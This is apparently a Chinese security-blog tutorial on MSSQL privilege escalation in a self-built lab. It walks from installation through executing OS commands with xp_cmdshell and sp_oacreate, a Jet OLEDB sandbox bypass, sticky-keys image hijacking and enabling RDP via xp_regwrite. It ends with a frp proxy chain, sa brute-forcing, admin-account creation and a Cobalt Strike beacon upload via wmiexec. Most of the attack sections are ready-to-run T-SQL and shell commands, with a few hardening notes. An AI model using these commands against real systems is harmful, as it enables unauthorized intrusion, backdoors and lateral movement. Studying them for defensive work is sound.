>
> 本篇文章是MSSQL数据库漏洞提权复现记录，记录了实际中常见的MSSQL数据库漏洞并如何利用，对漏洞底层的原理简单分析，主要分为五个部分：MSSQL简介、MSSQL各版本安装、MSSQL基本操作、MSSQL漏洞复现提权和自建内网环境实战。

本篇文章由浅入深地介绍了系统存储过程控制不当导致提权如sp_oacreate和sp_oamethod、扩展存储过程使用不当提权如xp_cmdshell和xp_regwrite、沙盒提权及映像劫持。在学习MSSQL过程中也阅读了几十篇中英文MSSQL相关技术文章，最终按照作者我的思路进行总结，相关参考文章也在文中有列出。此外，文中可能会出现部分错误，望读者指出，谢谢。接着，开始我们的MSSQL数据库渗透学习！！

## 一、MSSQL简介

`MSSQL(MicroSoft SQL
Server数据库)`，是微软开发的关系型数据库管理系统`DBMS`，是一个较大型的数据库，提供数据库的从服务器到终端的完整的解决方案，数据库管理系统`SSMS(SQL
Server Managerment Studio)`，是一个用于建立、使用和维护数据库的集成开发环境。 **端口号：1433**

### SA用户

在搭建时，选择使用`SQL Server`身份验证会创建SA账户并设置密码，`SA(System
Administrator)`表示系统管理员，在`SQLServer2019`之前的SA用户都是系统最高权限用户`SYSTEM`，但在2019版本时为普通数据库用户`mssqlserver`，是一个低权用户。

### MSSQL权限级别

> sa权限：数据库操作，文件管理，命令执行，注册表读取等价于system，SQLServer数据库的最高权限
>
> db权限：文件管理，数据库操作等价于 users-administrators
>
> public权限：数据库操作等价于 guest-users

### 存储过程

MSSQL的存储过程是一个可编程的函数，它在数据库中创建并保存，是使用T_SQL编写的代码段，目的在于能够方便的从系统表中查询信息。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式，使用`execute`命令执行存储过程。（可以将存储过程理解为函数调用的过程）

简单来说，存储过程就是一条或者多条sql语句的集合，可视为批处理文件

存储过程可分为三类： **系统存储过程：** 主要存储在master数据库中，以" **sp_**
"为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名 **扩展存储过程：**
是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以“ **xp** **_** "为前缀，使用方法与系统存储过程类似
**用户定义的存储过程：** 是SQLServer的使用者编写的存储过程

### 系统数据库

系统数据库默认创建时就会存在，有以下4种

![2shcQS.png](https://image.3001.net/images/20210609/1623172113_60bfa411ba66c98a73ecb.png!small)

数据库名| 含义  
---|---  
master| master数据库控制SQLserver数据库所有方面。这个数据库中包括了所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息等。  
model|
model数据库是建立所有用户数据库时的模版。新建数据库时，SQLserver会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模版对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。  
msdb|
msdb数据库是SQLserver数据库中的特例，若想查看此数据库的实际定义，会发现它其实是一个用户数据库。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQLserver
agent将会使用这个库。  
tempdb| 据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL
Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL
Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。  
  
### MSSQL注入

MSSQL注入与普通的MYSQL注入类似，但在数据结构特定函数名称上有些差异。而使用经过语法扩展的T-SQL语句，在实现更为复杂的业务的同时，也带来了安全上的危险。因此MSSQL在后续提权部分，与MYSQL有着较大的差异。由于该数据库与Windows平台的高契合度，使其可以使用Windows身份验证（或SA管理员账号），这就导致其运行权限较高。因此，若后续权限没有限制准确，WEB代码又存在SQL注入时，就会给整个服务器的安全带来严重威胁，其后果一般比Mysql被攻破要严重。

## 二、软件安装及环境搭建

### 1、MSSQL 2019安装

> Win2016 + MSSQL2019

下载地址：<https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads>

 **选择SQL Server 2019 Express Edition版本**

安装过程百度即可，这里记录其中较关键的地方：

    
    
    安装类型选择-基本(B)  
    实例配置选择-默认实例  
    服务器配置选择-混合模式(SQL Server身份验证和Windows 身份验证)(M)  
    配置SQL Server系统管理员SA的密码（我设置密码为123.com）

 **安装SQL Server Managerment Studio|SSMS**

安装完SQL Server Express版本后，可以直接选择安装`SSMS`

![2sh2LQ.png](https://image.3001.net/images/20210609/1623172127_60bfa41f506ae580b01c0.png!small)

    
    
    在点击"安装SSMS"弹出网页内选择下载SSMS  
    点击该程序，默认安装即可

### 2、MSSQL 2008 x64 安装

> Win2016 + MSSQL2008

下载地址：<https://www.microsoft.com/zh-CN/download/details.aspx?id=30438>

下载如图两个文件

![2shWZj.png](https://image.3001.net/images/20210609/1623172145_60bfa431b009523a84535.png!small)

 **先安装SQLEXPR_x64_CHS.exe**

基本安装过程类似2019的，记录下重要部分

    
    
    选择-全新安装  
    实例配置选择-默认实例  
    服务器配置选择-混合模式(SQL Server身份验证和Windows 身份验证)(M)  
    配置SQL Server系统管理员SA的密码（我设置密码为123.com）

 **再安装SQLManagementStudio_x64_CHS.exe**

提示没有安装`.NET3.5`，按下文步骤即可 <https://www.cnblogs.com/labster/p/14863516.html>

之后选择全新安装，默认下一步即可

### 3、MSSQL 2008 x32 安装

> Win2003 + MSSQL2008

下载地址：<https://www.microsoft.com/zh-CN/download/details.aspx?id=30438>

这里的32位系统环境用于复现第四部分的沙盒漏洞提权，相较于前两个数据库的安装，这里遇到了不少坑，较详细介绍下。使用`Win2003
x32`系统作为复现操作系统，由于年代久远加上03系统装08软件，记录下几个坑点。

1）启动`SQLEXPR_x86_CHS.exe`提示缺失程序

![2sh5iq.png](https://image.3001.net/images/20210609/1623172151_60bfa437cb4469f7d67c1.png!small)

2）安装`.NET 3.5`

慢慢等待5分钟

![2shIJ0.png](https://image.3001.net/images/20210609/1623172157_60bfa43d30a5b7e3efdff.png!small)

3）安装`Windows_Installer4.5x86.exe`

默认下一步

![2shoWV.png](https://image.3001.net/images/20210609/1623172161_60bfa4418da61412148f1.png!small)

4）安装`powershell2003x86-CHS.exe`

![2shTzT.png](https://image.3001.net/images/20210609/1623172169_60bfa4496308fe08b20d7.png!small)

其余安装过程类似，就不详细介绍了，附上安装工具包：

    
    
    https://pan.baidu.com/s/15CngCBWign9fY1IrSt4_jg  
    密码：fm4v

## 三、MSSQL基本操作

### 1、SSMS连接数据库

连接本地数据库，在之前的设置中，我们设置了混杂模式，即可以使用SQL Server 身份验证或 Windows 身份验证登陆进数据库，点击启动`SSMS`

服务器名称可以填写主机名或本地ip地址 登录名和密码为`sa:123.com`

![2shqL4.png](https://image.3001.net/images/20210609/1623172172_60bfa44cf1f87e6056adb.png!small)

> 注意点：可以一开始会出现使用主机名可以登入上，但是使用ip登入不上的情况可以参考如下文章解决
> <https://blog.csdn.net/weixin_30740295/article/details/95535927>

#### MSSQL设置允许通过ip登陆

（以2019版本为例，其余版本类似）

 **1）打开配置管理器**

![2shXw9.png](https://image.3001.net/images/20210609/1623172186_60bfa45aaf0b14ad9ba6c.png!small)

 **2）协议TCP/IP设置为开启**

在`SQL Server 网络配置`下的`MSSQLSERVER的协议`里启用`TCP/IP协议`

![2shbyF.png](https://image.3001.net/images/20210618/1624004051_60cc55d39bce338b4827f.png!small)

 **3）开启远程登陆**

先用主机名进行登陆

右键，打开数据库的属性

![2shOeJ.png](https://image.3001.net/images/20210609/1623172325_60bfa4e5903294457800f.png!small)

在`连接`处勾选`允许远程连接到此服务器`

![2shjoR.png](https://image.3001.net/images/20210609/1623172341_60bfa4f5a0ebfab1a55ee.png!small)

 **4）关闭防火墙**

这里用于渗透测试，直接全部关了

![2s4keH.png](https://image.3001.net/images/20210609/1623172345_60bfa4f9ef86ff2484796.png!small)

 **5）重启SSMS服务**

打开管理员模式下的CMD

    
    
    net stop mssqlserver  
    net start mssqlserver

之后就可以使用IP进行登陆

![2s4iOe.png](https://image.3001.net/images/20210609/1623172351_60bfa4ff4782687309489.png!small)

### 2、常见语句

右键系统数据库，新建查询

![2s4CQO.png](https://image.3001.net/images/20210609/1623172361_60bfa5090b03a28abd7fd.png!small)

查看数据库版本

    
    
    select @@VERSION

获取MSSQL中的所有数据库名

    
    
    SELECT name FROM MASter..SysDatabASes ORDER BY name  

查询所有数据库中的表名

    
    
    SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = 'U' and sysstat<200

其余见MSSQL基础学习部分，自行百度

    
    
    exec xp_dirtree 'c:'        # 列出所有c:\文件、目录、子目录  
    exec xp_dirtree 'c:',1      # 只列c:\目录  
    exec xp_dirtree 'c:',1,1    # 列c:\目录、文件  
    exec xp_subdirs 'C:';       # 只列c:\目录  
    select is_srvrolemember('sysadmin') # 判断是否是SA权限  
    select is_member('db_owner')        # 判断是否是db_owner权限    
    select is_srvrolemember('public')   # 判断是否是public权限  
    EXEC sp_configure 'Ole Automation Procedures'   #查看OLE Automation Procedures的当前设置

## 四、MSSQL漏洞复现

### 1、使用xp_cmdshell进行提权

> xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除

0x01 xp_cmdshell简介

`xp``_cmdshell`是`Sql Server`中的一个组件，将命令字符串作为操作系统命令 shell
执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过`xp``_cmdshell`来进行提权

 **影响范围：**

只要该数据库存在该组件，就可以利用

0x02 xp_cmdshell使用

 **1）查看xp_cmdshell状态**

    
    
    select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'

返回1表示`xp``_cmdshell`组件 **启用**

也可以手动查看，右键数据库，打开`Facets`

![2s4SW6.png](https://image.3001.net/images/20210609/1623172371_60bfa51349191c6e76b22.png!small)

在方面中选择`外应用配置器`，在方面属性中查看`XP``CmdShellEnabled`属性为`True`

![2s49SK.png](https://image.3001.net/images/20210609/1623172382_60bfa51e3204e1bab5e6c.png!small)

 **2）开启xp_cmdshell组件**

    
    
    EXEC sp_configure 'show advanced options', 1  
    RECONFIGURE  
    EXEC sp_configure 'xp_cmdshell',1  
    RECONFIGURE

![2s4PyD.png](https://image.3001.net/images/20210609/1623172388_60bfa5244c98bd9d4fac3.png!small)

同样，关闭该组件的命令为

    
    
    EXEC sp_configure 'show advanced options', 1  
    RECONFIGURE  
    EXEC sp_configure 'xp_cmdshell',0  
    RECONFIGURE

 **3）利用xp_cmdshell执行命令**

 **执行系统命令**

以下几条命令格式都可以用于执行系统命令

    
    
    exec xp_cmdshell "whoami"  
    master..xp_cmdshell 'whoami'    (2008版上好像用不了)  
    EXEC master..xp_cmdshell "whoami"  
    EXEC master.dbo.xp_cmdshell "ipconfig"

![2shzJx.png](https://image.3001.net/images/20210609/1623172393_60bfa5292cc42dcf72287.png!small)

> 注意点： 在MSSQL2019版本中，会使用mssqlserver用户而非system用户

#### 0x03 模拟实战：远程命令执行创建用户

这里通过演示远程命令执行来模拟实战情况，远程MSSQL数据库版本为2008版 环境信息：

    
    
    远程MSSQL数据库的IP：192.168.112.166

假设已经爆破得到了sa密码

##### 创建用户联合wmiexec拿到shell

    
    
    exec master..xp_cmdshell "net user test12 123.com /add"  
    exec master..xp_cmdshell "net localgroup administrators test12 /add"  
    exec master..xp_cmdshell "net user test12"

![2s4Jkn.png](https://image.3001.net/images/20210609/1623172397_60bfa52d2047963f3cac5.png!small)

可以看到用户添加成功

![2s4QOg.png](https://image.3001.net/images/20210609/1623172404_60bfa534c49324a03574d.png!small)

后续可以登陆用户上传木马，上线CS，详情见本文 **第五部分：二级内网MSSQL渗透|上线CS**

#### 0x04 保护措施

将该`xp_cmdshell`存储过程删除即可

    
    
    exec sp_dropextendedproc 'xp_cmdshell' 

被删除后，重新添加`xp``_cmdshell`存储过程语句

    
    
    EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int;  
    sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll';

若想彻底删除`xp_cmdshell`扩展存储过程，建议在C盘里直接搜索`xplog70.dll`，然后删除`xp_cmdshell`。

### 2、使用sp_oacreate进行提权|无回显

#### 0x01 sp_oacreate简介

> 调用wscript.shel执行命令

`sp_oacreate`系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合`sp_oamethod`系统存储过程调用系统`wscript.shell`来执行系统命令。`sp_oacreate`和`sp_oamethod`两个过程分别用来创建和执行脚本语言。

系统管理员使用`sp_configure`启用`sp_oacreate`和`sp_oamethod`系统存储过程对OLE自动化过程的访问（OLE
Automation Procedures）

在效果方面，`sp_oacreate、sp_oamethod`两个过程和`xp_cmdshell`过程功能类似，因此可以替换使用！

 **利用条件：**

> 1.已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）
>
> 2.sqlserver允许远程连接
>
> 3.OLE Automation Procedures选项开启

#### 0x02 sp_oacreate使用

 **1）查看sp_oacreate状态**

    
    
    select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE';

返回1表示存在`sp_oacreate`系统存储过程

 **2）启用OLE Automation Procedures选项**

当启用 OLE Automation Procedures 时，对 sp_OACreate 的调用将会启动 OLE 共享执行环境。

    
    
    exec sp_configure 'show advanced options',1;  
    reconfigure;  
    exec sp_configure 'Ole Automation Procedures',1;  
    reconfigure;

![2s43wj.png](https://image.3001.net/images/20210609/1623172417_60bfa541f393dc0f55e50.png!small)

类似的，关闭组件命令

    
    
    exec sp_configure 'show advanced options',1;  
    reconfigure;  
    exec sp_configure 'Ole Automation Procedures',0;  
    reconfigure;

 **3）利用sp_oacreate和sp_oamethod执行命令**

写入文件

    
    
    declare @shell int exec sp_oacreate 'wscript.shell',@shell output   
    exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\sqltest.txt';

回显0表示成功

![2s41mQ.png](https://image.3001.net/images/20210609/1623172426_60bfa54ac67c4dfa23061.png!small)

由于这里是无回显的命令执行，到另一台主机上查看效果，成功写入。

![2s48Ts.png](https://image.3001.net/images/20210609/1623172433_60bfa5516cb3b2da43e7e.png!small)

删除文件

    
    
    declare @result int  
    declare @fso_token int  
    exec sp_oacreate 'scripting.filesystemobject', @fso_token out  
    exec sp_oamethod @fso_token,'deletefile',null,'c:\sqltest.txt'  
    exec sp_oadestroy @fso_token

![2s4tf0.png](https://image.3001.net/images/20210609/1623172439_60bfa557061401da94a7f.png!small)

可以看到文件已删除

![2s4YYq.png](https://image.3001.net/images/20210609/1623172442_60bfa55a69810823bdf80.png!small)

同样，也可以使用4.1中的创建用户进行登陆拿shell。

### 3、利用SQL Server 沙盒提权

#### 0x01 SQL Server 沙盒简介

沙盒模式是一种安全功能，用于限制数据库只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性（如Kill
和 Shell 之类的函数），则可认为它是安全的。当数据库以沙盒模式运行时，调用这些函数的表达式将会产生错误消息。

沙盒提权的原理就是`jet.oledb`（修改注册表）执行系统命令。数据库通过查询方式调用`mdb`文件，执行参数，绕过系统本身自己的执行命令，实现`mdb`文件执行命令。

 **利用前提：**

> 1.需要`Microsoft.Jet.OLEDB.4.0`一般在32位系统才可以，64位机需要12.0，较复杂
>
> `2.dnary.mdb`和`ias.mdb`两个文件 在`win2003`上默认存在，也可自行准备

#### 0x02 沙盒提权

复现环境

    
    
    SQL Server2008 (Win2003-x32)  
    IP: 192.168.112.173

 **1）测试 jet.oledb 能否使用**

    
    
    select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c whoami")')

![2s42p6.png](https://image.3001.net/images/20210609/1623172446_60bfa55ecf872615eb97b.png!small)

 **2）开启Ad Hoc Distributed Queries组件**

    
    
    exec sp_configure 'show advanced options',1 ;  
    reconfigure ;  
    exec sp_configure 'Ad Hoc Distributed Queries',1 ;  
    reconfigure;

![2s4cfx.png](https://image.3001.net/images/20210609/1623172457_60bfa569c763672d86ee6.png!small)

类似的，关闭组件命令

    
    
    exec sp_configure 'show advanced options',1 ;  
    reconfigure ;  
    exec sp_configure 'Ad Hoc Distributed Queries',0 ;  
    reconfigure;

 **3）关闭沙盒模式**

    
    
    exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;  
    ​  
    沙盒模式`SandBoxMode`参数含义（默认是2）  
    0：在任何所有者中禁止启用安全模式  
    1：为仅在允许范围内  
    2：必须在access模式下  
    3：完全开启

![2s4D0J.png](https://image.3001.net/images/20210609/1623172476_60bfa57cf0df8688c3dbf.png!small)

查看命令：

    
    
    exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

关闭命令：

    
    
    exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',2

 **4）执行命令**

    
    
    Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c whoami >c:\\sqltest.txt ")');

在win2003的c盘上看到已经创建了该文件，命令执行成功

![2s4Bm4.png](https://image.3001.net/images/20210609/1623172485_60bfa585574805070bb54.png!small)

同样，可以创建用户

    
    
    Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user testq QWEasd123 /add")');  
    ​  
    Select * From OpenRowSet('microsoft.jet.oledb.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators testq /add")');  
    ​  
    Select * From OpenRowSet('microsoft.jet.oledb.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user testq")');

### 4、使用xp_regwrite提权 | 映像劫持提权

> 2008以上，05未测试

#### 0x01 简介

通过使用`xp_regwrite`存储过程对注册表进行修改，替换成任意值，造成镜像劫持。

前提条件：

> 1.未禁止注册表编辑（即写入功能）
>
> 2.xp_regwrite启用

#### 0x02 映像劫持提权

1）查看xp_regwrite是否启用

    
    
    select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'

2）xp_regwrite开启与关闭

    
    
    EXEC sp_configure 'show advanced options', 1  
    RECONFIGURE  
    EXEC sp_configure 'xp_regwrite',1  
    RECONFIGURE

2）利用regwrite函数修改组注册表进行劫持

    
    
    EXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\windows\system32\cmd.exe'

![2s4ykR.png](https://image.3001.net/images/20210609/1623172491_60bfa58babf03f33e4a84.png!small)

2）查看是否修改成功文件

    
    
    exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'

![2s4r79.png](https://image.3001.net/images/20210609/1623172497_60bfa591109912d1b6af1.png!small)

显示已修改为`cmd.exe`

在目标主机上查看，结果一致

![2s46t1.png](https://image.3001.net/images/20210609/1623172501_60bfa5958306b3692954e.png!small)

3）验证是否成功

连按5次粘滞键，弹出cmd框

![2s4W6O.png](https://image.3001.net/images/20210609/1623172506_60bfa59a72b06b5501992.png!small)

 **拓展：**

上面对只是对粘滞键进行修改，类似的，可以在注册表中进行其他操作

 **删除指定注册表键值对**

删除粘滞键的键值

    
    
    xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'

![2s44ne.png](https://image.3001.net/images/20210609/1623172518_60bfa5a6a796077bdbc9f.png!small)

到目标主机上查看，发现sethc.exe在注册表中的值已删除

![2s4fXD.png](https://image.3001.net/images/20210609/1623172529_60bfa5b184a7cdd615c0f.png!small)

 **开启3389端口** 这里的`xp``_regwrite`为向注册表中写数据

    
    
    exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;  
    ​  
    exec master..xp_cmdshell "REG ADD 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0"

![2s450H.png](https://image.3001.net/images/20210609/1623172534_60bfa5b6771225c351030.png!small)

在注册表中也可以看到3389端口被打开

![2s4I7d.png](https://image.3001.net/images/20210609/1623172539_60bfa5bb90cab594bb47c.png!small)

#### 0x03 参考

<https://sqlandme.com/tag/xp_regwrite/>

[IFEO映像劫持在实战中的使用 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/96504762)

### 5、使用sp_makewebtask写文件

> 2005

一般可以用于web网站，写入后门文件

1）查看该组件

    
    
    EXEC sp_configure 'Web Assistant Procedures'

2）开启该组件

    
    
    exec sp_configure 'Web Assistant Procedures', 1; RECONFIGURE

报错，在SQLServer2005后好像都没有这个组件了

### 6、拓展&小结

常见的存储过程：

    
    
    xp_cmdshell         执行系统命令  
    xp_fileexist        确定一个文件是否存在。  
    xp_getfiledetails   获得文件详细资料。  
    xp_dirtree          展开你需要了解的目录，获得所有目录深度。  
    Xp_getnetname       获得服务器名称。  
    ​  
    注册表访问的存储过程  
    Xp_regwrite  
    Xp_regread  
    Xp_regdeletekey  
    Xp_regaddmultistring  
    Xp_regdeletevalue  
    Xp_regenumvalues  
    Xp_regremovemultistring  
    ​  
    OLE自动存储过程  
    Sp_OACreate Sp_OADestroy Sp_OAGetErrorInfo Sp_OAGetProperty  
    Sp_OAMethod Sp_OASetProperty Sp_OAStop  

## 五、二级内网MSSQL渗透|上线CS

这里模拟搭建二级内网环境，顺便复习下二级frp代理的搭建和内网穿透上线CS。环境配置信息如下

    
    
    公网服务器  
    121.xx.xx.xx  
    ​  
    Web服务器(目标站点)  
    192.168.73.137(对外)  
    10.10.10.101(对内)  
    ​  
    域控  
    10.10.10.10  
    10.12.10.5  
    ​  
    MSSQL服务器  
    10.12.10.3

这里假设已经获取到了 **Web服务器和域控** 的权限

### 1、搭建二级代理

1）在域控上传`frpc.exe`和`frpc.ini`文件

    
    
    #frpc.ini  
    [common]  
    server_addr = 10.10.10.101  
    server_port = 12010     # 连接端口  
    [http_proxy]  
    type = tcp  
    remote_port = 1084      # 代理端口  
    plugin = socks5

2）在Web服务器上传`frpc.exe、frpc.ini、frps.exe、frps.ini`文件

    
    
    # frps.ini  
    [common]  
    bind_addr = 10.10.10.101  
    bind_port = 12010   
    ​  
    # frpc.ini  
    [common]  
    server_addr = 121.xx.xx.xx  
    server_port = 12010  
    [http_proxy]  
    type = tcp  
    local_ip = 10.10.10.101  
    local_port = 1084  
    remote_port = 1084

3）在公网服务器上传`frps.exe`和`frps.ini`

    
    
    #frps.ini  
    [common]  
    bind_addr = 0.0.0.0  
    bind_port = 12010 

4）依次连接（由内到外）

    
    
    web服务器  
    frps.exe -c frps.ini  
    域控  
    frpc.exe -c frpc.ini  
    ​  
    公网服务器  
    frps.exe -c frps.ini  
    web服务器  
    frpc.exe -c frpc.ini

### 2、爆破sa密码

使用fscan扫描，顺便进行弱口令爆破，成功爆破出sa密码

![2s4z7j.png](https://image.3001.net/images/20210609/1623172543_60bfa5bf0a56f977b8d02.png!small)

也可以使用msf模块爆破

### 3、设置代理|远程登陆MSSQL

使用Proxifier设置代理，添加代理服务器信息

![2s4xBQ.png](https://image.3001.net/images/20210609/1623172546_60bfa5c29868a829111e9.png!small)

连接MSSQL数据库

![2s4vng.png](https://image.3001.net/images/20210609/1623172555_60bfa5cb16830f9c289e4.png!small)

成功连接！！

![2s4XjS.png](https://image.3001.net/images/20210609/1623172567_60bfa5d77a4446f1d4034.png!small)

### 4、使用xp_cmdshell创建用户

> 这里也可以使用其他方法命令执行

 **1）查看开启xp_cmdshell组件**

    
    
    EXEC sp_configure 'show advanced options', 1  
    RECONFIGURE  
    EXEC sp_configure 'xp_cmdshell',1  
    RECONFIGURE

![2s4Oc8.png](https://image.3001.net/images/20210609/1623172575_60bfa5df9c228c7a4d59c.png!small)

 **2）查看当前权限**

    
    
    exec master..xp_cmdshell "whoami"

![2s47tI.png](https://image.3001.net/images/20210609/1623172579_60bfa5e35f86deee47139.png!small)

system权限，可以创建用户

 **3）创建用户并添加至管理员组**

创建`sqltest`用户，密码为`123.com`

    
    
    exec master..xp_cmdshell "net user test12 123.com /add"  
    exec master..xp_cmdshell "net localgroup administrators test12 /add"  
    exec master..xp_cmdshell "net user test12"

![2s4Hht.png](https://image.3001.net/images/20210609/1623172583_60bfa5e71a10ef430278d.png!small)

 **4）CS生成后门文件（中转监听器）**

在域控上建立中转监听器

![2s4TAA.png](https://image.3001.net/images/20210609/1623172591_60bfa5ef5a045f6564fc8.png!small)

![](https://image.3001.net/images/20210609/1623172599_60bfa5f7ec1ef795eae66.png!small)

将生成好后的文件拷贝到kali上

 **5）使用wmiexec工具远程登陆**

    
    
    proxychains python3 wmiexec.py tset12:123.com@10.12.10.3

上传木马文件

![2s4q9P.png](https://image.3001.net/images/20210609/1623172605_60bfa5fd5c0731af3c3f9.png!small)

 **6）成功上线CS**

![2s4L1f.png](https://image.3001.net/images/20210609/1623172610_60bfa6025208125c140ff.png!small)

## 六、总结

本文介绍了几种提权拿shell的方法，主要是利用到了系统存储过程和扩展存储过程。最常见的xp_cmdshell可以用于执行系统命令，xp_regwrite、xp_regread用于注册表的读写进行映像劫持，sp_oacreate、sp_oamethod基于OLE
Automation Procedures执行系统命令，不过无回显，基于沙盒的提权限制条件比较多且复杂，一般很少使用。

## 七、参考

> 存储过程  
> <https://www.cnblogs.com/selene/p/4483612.html>
>
> OLE 自动存储过程  
> [https://docs.microsoft.com/zh-cn/previous-versions/sql/sql-> server-2012/ms190501(v=sql.110) ](https://docs.microsoft.com/zh-cn/previous-> versions/sql/sql-server-2012/ms190501\(v=sql.110\)
> "https://docs.microsoft.com/zh-cn/previous-versions/sql/sql-> server-2012/ms190501\(v=sql.110\)")
>
> 提权技巧 + 备份getsehll  
> <https://www.anquanke.com/post/id/200154#h2-13>
>
> sql语句讲解  
> <https://blog.51cto.com/u_11797152/2411770>
>
> Waitalone大佬写的  
> <https://www.cnblogs.com/jerrylocker/p/10938899.html>
>
> MSSQL安全基础  
> <https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI>
>
> tide团队文档  
> <https://www.yuque.com/tidesec/wiki/evrghn#BJGP7>
>
> MSSQL2005版本的研究  
> <https://zhuanlan.zhihu.com/p/31111348>
>
> 多种姿势干货  
> <https://y4er.com/post/mssql-getshell/>

